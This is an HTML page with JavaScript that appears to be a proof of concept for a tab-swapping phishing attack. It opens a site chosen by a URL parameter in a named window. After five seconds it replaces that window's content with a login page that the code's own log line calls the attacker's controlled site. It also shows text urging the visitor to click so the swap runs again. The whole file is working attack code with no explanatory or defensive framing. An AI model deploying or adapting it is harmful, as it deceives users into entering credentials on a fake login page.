
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            background-color: white;
            width: 100%;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;

            font-family: Arial, sans-serif;
        }
        #message {
            color: black;

        }
    </style>
    <script>
        function tParam(qParam) {
            const frmURL = window.location.search.substring(1);
            const varURL = frmURL.split('&');
            for (let i = 0; i < varURL.length; i++) {
                const vParam = varURL[i].split('=');
                if (vParam[0] === qParam) {
                    return vParam[1];
                }
            }
            window.location.href = "https://evanricafort.com";
        }

        function init() {
            console.log("Redirecting to attacker's controlled site");
            foo.location.href = "https://evanricafort.com/testlogin.html";
        }

        function launch() {
            const target = tParam("target");
            foo = window.open(target, "foo", "");
            console.log("Target site opened successfully");
            setTimeout(init, 5000);
        }

        function setup() {
            const target = tParam("target");
            document.body.addEventListener('click', launch);
            const message = document.createElement('div');
            message.id = 'message';
            message.innerText = `If the site did not automatically redirect to ${target}, click anywhere in the white background`;
            document.body.appendChild(message);
            launch();
        }

        window.onload = setup;
</script>
